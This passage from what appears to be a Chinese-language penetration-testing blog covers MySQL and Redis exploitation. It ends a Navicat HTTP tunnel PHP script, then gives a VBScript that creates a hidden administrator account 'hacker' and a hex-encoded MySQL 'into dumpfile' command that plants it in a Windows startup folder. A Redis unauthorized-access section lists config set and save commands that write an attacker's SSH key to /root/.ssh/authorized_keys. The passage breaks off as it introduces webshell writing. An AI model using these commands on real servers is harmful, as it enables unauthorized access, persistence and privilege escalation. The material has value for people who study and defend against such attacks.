&#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$numfields</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">							EchoFieldsHeader(<span class="variable">$res</span>, <span class="variable">$numfields</span>);</span><br><span class="line">							EchoData(<span class="variable">$res</span>, <span class="variable">$numfields</span>, <span class="variable">$numrows</span>);</span><br><span class="line">						&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">							<span class="keyword">if</span>(phpversion_int() &gt;= <span class="number">40300</span>)</span><br><span class="line">								<span class="keyword">echo</span> GetBlock(mysql_info(<span class="variable">$conn</span>));</span><br><span class="line">							<span class="keyword">else</span></span><br><span class="line">								<span class="keyword">echo</span> GetBlock(<span class="string">&quot;&quot;</span>);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$i</span>&lt;(count(<span class="variable">$_POST</span>[<span class="string">&quot;q&quot;</span>])-<span class="number">1</span>))</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">&quot;\x01&quot;</span>;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						<span class="keyword">echo</span> <span class="string">&quot;\x00&quot;</span>;</span><br><span class="line">					mysql_free_result(<span class="variable">$res</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	header(<span class="string">&quot;Content-Type: text/html&quot;</span>);</span><br><span class="line"><span class="comment">////</span></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;Navicat HTTP Tunnel Tester&lt;/title&gt;</span><br><span class="line">	&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=ISO-8859-1&quot;</span>&gt;</span><br><span class="line">	&lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">		body&#123;</span><br><span class="line">			margin: <span class="number">30</span>px;</span><br><span class="line">			font-family: Tahoma;</span><br><span class="line">			font-weight: normal;</span><br><span class="line">			font-size: <span class="number">14</span>px;</span><br><span class="line">			color: <span class="comment">#222222;</span></span><br><span class="line">		&#125;</span><br><span class="line">		table&#123;</span><br><span class="line">			width: <span class="number">100</span>%;</span><br><span class="line">			border: <span class="number">0</span>px;</span><br><span class="line">		&#125;</span><br><span class="line">		input&#123;</span><br><span class="line">			font-family:Tahoma,sans-serif;</span><br><span class="line">			border-style:solid;</span><br><span class="line">			border-color:<span class="comment">#666666;</span></span><br><span class="line">			border-width:<span class="number">1</span>px;</span><br><span class="line">		&#125;</span><br><span class="line">		fieldset&#123;</span><br><span class="line">			border-style:solid;</span><br><span class="line">			border-color:<span class="comment">#666666;</span></span><br><span class="line">			border-width:<span class="number">1</span>px;</span><br><span class="line">		&#125;</span><br><span class="line">		.Title1&#123;</span><br><span class="line">			font-size: <span class="number">30</span>px;</span><br><span class="line">			color: <span class="comment">#003366;</span></span><br><span class="line">		&#125;</span><br><span class="line">		.Title2&#123;</span><br><span class="line">			font-size: <span class="number">10</span>px;</span><br><span class="line">			color: <span class="comment">#999966;</span></span><br><span class="line">		&#125;</span><br><span class="line">		.TestDesc&#123;</span><br><span class="line">			width:<span class="number">70</span>%</span><br><span class="line">		&#125;</span><br><span class="line">		.TestSucc&#123;</span><br><span class="line">			color: <span class="comment">#00BB00;</span></span><br><span class="line">		&#125;</span><br><span class="line">		.TestFail&#123;</span><br><span class="line">			color: <span class="comment">#DD0000;</span></span><br><span class="line">		&#125;</span><br><span class="line">		.mysql&#123;</span><br><span class="line">		&#125;</span><br><span class="line">		.pgsql&#123;</span><br><span class="line">			display:none;</span><br><span class="line">		&#125;</span><br><span class="line">		.sqlite&#123;</span><br><span class="line">			display:none;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">#page&#123;</span></span><br><span class="line">			max-width: <span class="number">42</span>em;</span><br><span class="line">			min-width: <span class="number">36</span>em;</span><br><span class="line">			border-width: <span class="number">0</span>px;</span><br><span class="line">			margin: auto auto;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">#host, #dbfile&#123;</span></span><br><span class="line">			width: <span class="number">300</span>px;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">#port&#123;</span></span><br><span class="line">			width: <span class="number">75</span>px;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">#login, #password, #db&#123;</span></span><br><span class="line">			width: <span class="number">150</span>px;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">#Copyright&#123;</span></span><br><span class="line">			text-align: right;</span><br><span class="line">			font-size: <span class="number">10</span>px;</span><br><span class="line">			color: <span class="comment">#888888;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&lt;/style&gt;</span><br><span class="line">	&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getInternetExplorerVersion</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">var</span> ver = -<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span> (navigator.appName == <span class="string">&quot;Microsoft Internet Explorer&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">var</span> regex = <span class="keyword">new</span> RegExp(<span class="string">&quot;MSIE ([0-9]&#123;1,&#125;[\.0-9]&#123;0,&#125;)&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span> (regex.exec(navigator.userAgent))</span><br><span class="line">				ver = parseFloat(RegExp.$<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> ver;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setText</span>(<span class="params">element, text, succ</span>)</span>&#123;</span><br><span class="line">		element.className = (succ)?<span class="string">&quot;TestSucc&quot;</span>:<span class="string">&quot;TestFail&quot;</span>;</span><br><span class="line">		element.innerHTML = text;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getByteAt</span>(<span class="params">str, offset</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> str.charCodeAt(offset) &amp; <span class="number">0xff</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getIntAt</span>(<span class="params">binStr, offset</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> (getByteAt(binStr, offset) &lt;&lt; <span class="number">24</span>)+</span><br><span class="line">			(getByteAt(binStr, offset+<span class="number">1</span>) &lt;&lt; <span class="number">16</span>)+</span><br><span class="line">			(getByteAt(binStr, offset+<span class="number">2</span>) &lt;&lt; <span class="number">8</span>)+</span><br><span class="line">			(getByteAt(binStr, offset+<span class="number">3</span>) &gt;&gt;&gt; <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getBlockStr</span>(<span class="params">binStr, offset</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (getByteAt(binStr, offset) &lt; <span class="number">254</span>)</span><br><span class="line">			<span class="keyword">return</span> binStr.substring(offset+<span class="number">1</span>, offset+<span class="number">1</span>+binStr.charCodeAt(offset));</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> binStr.substring(offset+<span class="number">5</span>, offset+<span class="number">5</span>+getIntAt(binStr, offset+<span class="number">1</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">doServerTest</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">var</span> version = getInternetExplorerVersion();</span><br><span class="line">		<span class="keyword">if</span> (version==-<span class="number">1</span> || version&gt;=<span class="number">9.0</span>)&#123;</span><br><span class="line">			<span class="keyword">var</span> xmlhttp = (window.XMLHttpRequest)? <span class="keyword">new</span> XMLHttpRequest() : xmlhttp=<span class="keyword">new</span> ActiveXObject(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">			</span><br><span class="line">			xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">				<span class="keyword">var</span> outputDiv = document.getElementById(<span class="string">&quot;ServerTest&quot;</span>);</span><br><span class="line">				<span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>)&#123;</span><br><span class="line">					<span class="keyword">if</span> (xmlhttp.status == <span class="number">200</span>)&#123;</span><br><span class="line">						<span class="keyword">var</span> errno = getIntAt(xmlhttp.responseText, <span class="number">6</span>);</span><br><span class="line">						<span class="keyword">if</span> (errno == <span class="number">0</span>)</span><br><span class="line">							setText(outputDiv, <span class="string">&quot;Connection Success!&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">							setText(outputDiv, parseInt(errno)+<span class="string">&quot; - &quot;</span>+getBlockStr(xmlhttp.responseText, <span class="number">16</span>), <span class="literal">false</span>);</span><br><span class="line">					&#125;<span class="keyword">else</span></span><br><span class="line">						setText(outputDiv, <span class="string">&quot;HTTP Error - &quot;</span>+xmlhttp.status, <span class="literal">false</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">var</span> params = <span class="string">&quot;&quot;</span>;</span><br><span class="line">			<span class="keyword">var</span> form = document.getElementById(<span class="string">&quot;TestServerForm&quot;</span>);</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;form.elements.length; i++)&#123;</span><br><span class="line">				<span class="keyword">if</span> (i&gt;<span class="number">0</span>) params += <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">				params += form.elements[i].id+<span class="string">&quot;=&quot;</span>+form.elements[i].value.replace(<span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;%26&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			document.getElementById(<span class="string">&quot;ServerTest&quot;</span>).className = <span class="string">&quot;&quot;</span>;</span><br><span class="line">			document.getElementById(<span class="string">&quot;ServerTest&quot;</span>).innerHTML = <span class="string">&quot;Connecting...&quot;</span>;</span><br><span class="line">			xmlhttp.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">			xmlhttp.setRequestHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">			xmlhttp.setRequestHeader(<span class="string">&quot;Content-length&quot;</span>, params.length);</span><br><span class="line">			xmlhttp.setRequestHeader(<span class="string">&quot;Connection&quot;</span>, <span class="string">&quot;close&quot;</span>);</span><br><span class="line">			xmlhttp.send(params);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			document.getElementById(<span class="string">&quot;ServerTest&quot;</span>).className = <span class="string">&quot;&quot;</span>;</span><br><span class="line">			document.getElementById(<span class="string">&quot;ServerTest&quot;</span>).innerHTML = <span class="string">&quot;Internet Explorer &quot;</span>+version+<span class="string">&quot; is not supported, please use Internet explorer 9.0 or above, firefox, chrome or safari&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;page&quot;</span>&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">	&lt;font <span class="class"><span class="keyword">class</span>=&quot;<span class="title">Title1</span>&quot;&gt;<span class="title">Navicat</span>&amp;<span class="title">trade</span>;&lt;/<span class="title">font</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">font</span> <span class="title">class</span>=&quot;<span class="title">Title2</span>&quot;&gt;<span class="title">The</span> <span class="title">gateway</span> <span class="title">to</span> <span class="title">your</span> <span class="title">database</span>!&lt;/<span class="title">font</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">fieldset</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">legend</span>&gt;<span class="title">System</span> <span class="title">Environment</span> <span class="title">Test</span>&lt;/<span class="title">legend</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">tr</span> <span class="title">style</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> &quot;<span class="title">display</span>:<span class="title">none</span>&quot;; ?&gt;&quot;&gt;&lt;<span class="title">td</span> <span class="title">width</span>=70%&gt;<span class="title">PHP</span> <span class="title">installed</span> <span class="title">properly</span>&lt;/<span class="title">td</span>&gt;&lt;<span class="title">td</span> <span class="title">class</span>=&quot;<span class="title">TestFail</span>&quot;&gt;<span class="title">No</span>&lt;/<span class="title">td</span>&gt;&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">doSystemTest</span>();?&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">fieldset</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">fieldset</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">legend</span>&gt;<span class="title">Server</span> <span class="title">Test</span>&lt;/<span class="title">legend</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">form</span> <span class="title">id</span>=&quot;<span class="title">TestServerForm</span>&quot; <span class="title">action</span>=&quot;#&quot; <span class="title">onSubmit</span>=&quot;<span class="title">return</span> <span class="title">false</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">input</span> <span class="title">type</span>=<span class="title">hidden</span> <span class="title">id</span>=&quot;<span class="title">actn</span>&quot; <span class="title">value</span>=&quot;<span class="title">C</span>&quot;&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">tr</span> <span class="title">class</span>=&quot;<span class="title">mysql</span>&quot;&gt;&lt;<span class="title">td</span> <span class="title">width</span>=&quot;35%&quot;&gt;<span class="title">Hostname</span>/<span class="title">IP</span> <span class="title">Address</span>:&lt;/<span class="title">td</span>&gt;&lt;<span class="title">td</span>&gt;&lt;<span class="title">input</span> <span class="title">type</span>=<span class="title">text</span> <span class="title">id</span>=&quot;<span class="title">host</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">localhost</span>&quot;&gt;&lt;/<span class="title">td</span>&gt;&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">tr</span> <span class="title">class</span>=&quot;<span class="title">mysql</span>&quot;&gt;&lt;<span class="title">td</span>&gt;<span class="title">Port</span>:&lt;/<span class="title">td</span>&gt;&lt;<span class="title">td</span>&gt;&lt;<span class="title">input</span> <span class="title">type</span>=<span class="title">text</span> <span class="title">id</span>=&quot;<span class="title">port</span>&quot; <span class="title">placeholder</span>=&quot;3306&quot;&gt;&lt;/<span class="title">td</span>&gt;&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">tr</span> <span class="title">class</span>=&quot;<span class="title">pgsql</span>&quot;&gt;&lt;<span class="title">td</span>&gt;<span class="title">Initial</span> <span class="title">Database</span>:&lt;/<span class="title">td</span>&gt;&lt;<span class="title">td</span>&gt;&lt;<span class="title">input</span> <span class="title">type</span>=<span class="title">text</span> <span class="title">id</span>=&quot;<span class="title">db</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">template1</span>&quot;&gt;&lt;/<span class="title">td</span>&gt;&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">tr</span> <span class="title">class</span>=&quot;<span class="title">mysql</span>&quot;&gt;&lt;<span class="title">td</span>&gt;<span class="title">Username</span>:&lt;/<span class="title">td</span>&gt;&lt;<span class="title">td</span>&gt;&lt;<span class="title">input</span> <span class="title">type</span>=<span class="title">text</span> <span class="title">id</span>=&quot;<span class="title">login</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">root</span>&quot;&gt;&lt;/<span class="title">td</span>&gt;&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">tr</span> <span class="title">class</span>=&quot;<span class="title">mysql</span>&quot;&gt;&lt;<span class="title">td</span>&gt;<span class="title">Password</span>:&lt;/<span class="title">td</span>&gt;&lt;<span class="title">td</span>&gt;&lt;<span class="title">input</span> <span class="title">type</span>=<span class="title">password</span> <span class="title">id</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;&quot;&gt;&lt;/<span class="title">td</span>&gt;&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">tr</span> <span class="title">class</span>=&quot;<span class="title">sqlite</span>&quot;&gt;&lt;<span class="title">td</span>&gt;<span class="title">Database</span> <span class="title">File</span>:&lt;/<span class="title">td</span>&gt;&lt;<span class="title">td</span>&gt;&lt;<span class="title">input</span> <span class="title">type</span>=<span class="title">text</span> <span class="title">id</span>=&quot;<span class="title">dbfile</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">sqlite</span>.<span class="title">db</span>&quot;&gt;&lt;/<span class="title">td</span>&gt;&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">tr</span>&gt;&lt;<span class="title">td</span>&gt;&lt;/<span class="title">td</span>&gt;&lt;<span class="title">td</span>&gt;&lt;<span class="title">br</span>&gt;&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">TestButton</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Test</span> <span class="title">Connection</span>&quot; <span class="title">onClick</span>=&quot;<span class="title">doServerTest</span>()&quot;&gt;&lt;/<span class="title">td</span>&gt;&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">ServerTest</span>&quot;&gt;&lt;<span class="title">br</span>&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">fieldset</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">p</span> <span class="title">id</span>=&quot;<span class="title">Copyright</span>&quot;&gt;<span class="title">Copyright</span> &amp;<span class="title">copy</span>; <span class="title">PremiumSoft</span> &amp;<span class="title">trade</span>; <span class="title">CyberTech</span> <span class="title">Ltd</span>. <span class="title">All</span> <span class="title">Rights</span> <span class="title">Reserved</span>.&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后连接Navicat，选择HTTP通道，输入带有php脚本的远程链接</p>
<p>然后地址选择本地<code>localhost</code>选择连接，然后就可以执行MySQL命令了</p>
<h2 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h2><p>当 Windows 的启动项可以被 MySQL 写入的时候可以使用 MySQL 将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行。</p>
<p><strong>启动项路径</strong></p>
<p><strong>Windows Server 2003</strong> 的启动项路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 中文系统</span></span><br><span class="line">C:\Documents and Settings\Administrator\「开始」菜单\程序\启动</span><br><span class="line">C:\Documents and Settings\All Users\「开始」菜单\程序\启动</span><br><span class="line"></span><br><span class="line"><span class="comment"># 英文系统</span></span><br><span class="line">C:\Documents and Settings\Administrator\Start Menu\Programs\Startup</span><br><span class="line">C:\Documents and Settings\All Users\Start Menu\Programs\Startup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开关机项 需要自己建立对应文件夹</span></span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup</span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown</span><br></pre></td></tr></table></figure>

<p><strong>Windows Server 2008</strong> 的启动项路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>

<p>既然知道路径的话就往启动项路径里面写入脚本吧，脚本支持 vbs 和 exe 类型，可以利用 vbs 执行一些 CMD 命令，也可以使用 exe 上线 MSF 或者 CS 这方面还是比较灵活的。下面是一个执行基础命令的 VB 脚本</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Set</span> WshShell=WScript.<span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">WshShell.Run <span class="string">&quot;net user hacker P@ssw0rd /add&quot;</span>, <span class="number">0</span></span><br><span class="line">WshShell.Run <span class="string">&quot;net localgroup administrators hacker /add&quot;</span>, <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>将上述 vbs 或者 CS 的马转十六进制直接写如到系统启动项中,然后等待系统用户重新登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql &gt; select 0x536574205773685368656C6C3D575363726970742E4372656174654F626A6563742822575363726970742E5368656C6C22290A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C20300A into dumpfile &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.vbs&quot;;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>服务器应用漏洞</category>
        <category>Mysql数据库</category>
        <category>内网渗透</category>
        <category>提权</category>
        <category>数据库提权</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis 未授权访问漏洞</title>
    <url>//fb3d18df70f1.html</url>
    <content><![CDATA[<h2 id="Redis-简介"><a href="#Redis-简介" class="headerlink" title="Redis 简介"></a>Redis 简介</h2><p>​    Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API</p>
<h2 id="服务特征"><a href="#服务特征" class="headerlink" title="服务特征"></a>服务特征</h2><p>常见端口：6379</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>下载</strong></p>
<p>官方（Linux版本）：<a href="https://redis.io/download">https://redis.io/download</a></p>
<p>中文版官方（Linux版本）：<a href="http://www.redis.cn/download.html">http://www.redis.cn/download.html</a></p>
<p>Windows版：<a href="https://github.com/MicrosoftArchive/redis/releases">https://github.com/MicrosoftArchive/redis/releases</a></p>
<p><strong>启动</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows</span><br><span class="line"># 启动服务</span><br><span class="line">redis-server redis.windows.conf</span><br><span class="line"># 启动Redis</span><br><span class="line">redis-cli.exe -h 127.0.0.1 -p 6379 -a &quot;admin&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">linux通用</span><br><span class="line">wget http://download.redis.io/releases/redis-4.0.8.tar.gz</span><br><span class="line">tar –xvf redis-4.0.8.tar.gz</span><br><span class="line">cd redis-4.0.8</span><br><span class="line"># 编译</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"># 启动服务</span><br><span class="line">./src/redis-server redis.conf</span><br><span class="line"># 启动Redis</span><br><span class="line">redis-cli -h 127.0.0.1 -p 6379 -a &quot;admin&quot;</span><br><span class="line">./redis-cli -h 127.0.0.1 -p 6379 -a &quot;admin&quot;</span><br></pre></td></tr></table></figure>



<p><strong>配置</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./src/redis.conf</span><br><span class="line"></span><br><span class="line">#bind 127.0.0.1  //注释掉，意思是仅本地访问</span><br><span class="line">protected-mode no    //非保护模式</span><br><span class="line">daemonize yes    //进程守护，后台运行</span><br></pre></td></tr></table></figure>



<h2 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">info			# 查看信息</span><br><span class="line">flushall		# 删除所有数据库内容</span><br><span class="line">flushdb			# 刷新数据库</span><br><span class="line">KEYS * 			# 查看所有键，使用 select num 可以查看键值数据</span><br><span class="line">config set dir dirpath			# 设置路径等配置</span><br><span class="line">config set dbfilename name		# 建立文件</span><br><span class="line">set test &quot;xxx&quot;		# 设置变量</span><br><span class="line">save				# 保存</span><br><span class="line">get 变量				# 查看变量名称</span><br></pre></td></tr></table></figure>



<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，如果Redis以root身份运行，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
<p>​    Redis因配置不当可以未授权访问（窃取数据、反弹shell、数据备份操作主从复制、命令执行）。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>Redis 2.x</li>
<li>Redis 3.x</li>
<li>Redis 4.x</li>
<li>Redis 5.x</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="redis写入ssh公钥，获取操作系统权限"><a href="#redis写入ssh公钥，获取操作系统权限" class="headerlink" title="redis写入ssh公钥，获取操作系统权限"></a>redis写入ssh公钥，获取操作系统权限</h3><p>​        利用了redis数据库的备份功能，当redis以root身份运行，利用Redis的config set命令，只要内容为SSH公钥内容，文件路径满足公钥存放的位置，就可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器。</p>
<p>利用条件：</p>
<ul>
<li>Root 权限</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在本地创建公钥文件</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"><span class="meta">#</span><span class="bash"> 切换到存储公钥的目录，在创建的时候会提示路径</span></span><br><span class="line">cd /root/.ssh</span><br><span class="line">cd /home/kali/.ssh</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将生成的公钥文件导入txt</span></span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rea.pub; echo -e &quot;\n\n&quot;)&gt;key.txt</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 把key.txt文件内容写入目标主机的缓冲里</span></span><br><span class="line">cat /home/kali/.ssh/key.txt | ./redis-cli -h 127.0.0.1 -p 6379 -x set xxx</span><br><span class="line"><span class="meta">#</span><span class="bash"> 更改文件路径</span></span><br><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用SSH连接</span></span><br><span class="line">ssh -i id_rsa root@127.0.0.1</span><br></pre></td></tr></table></figure>



<h3 id="在Web目录中写webshell"><a href="#在Web目录中写webshell" class="headerlink" title="在Web目录中写webshell"></a>在Web目录中写webshell</h3><p>​        利用了redis数据库的备份功能，在知道了网站路径以后，使用redis的CONFIG set命令，将文件内容为一句话木马，文件路径为网站根目录的wenshell写入目标服务器。</p>
<p>利用条件：</p>
<ul>
<li>成功连接到Redis</li>
<li>知道Web路径</li>
<li>具有文件读写权限</li>
</ul>
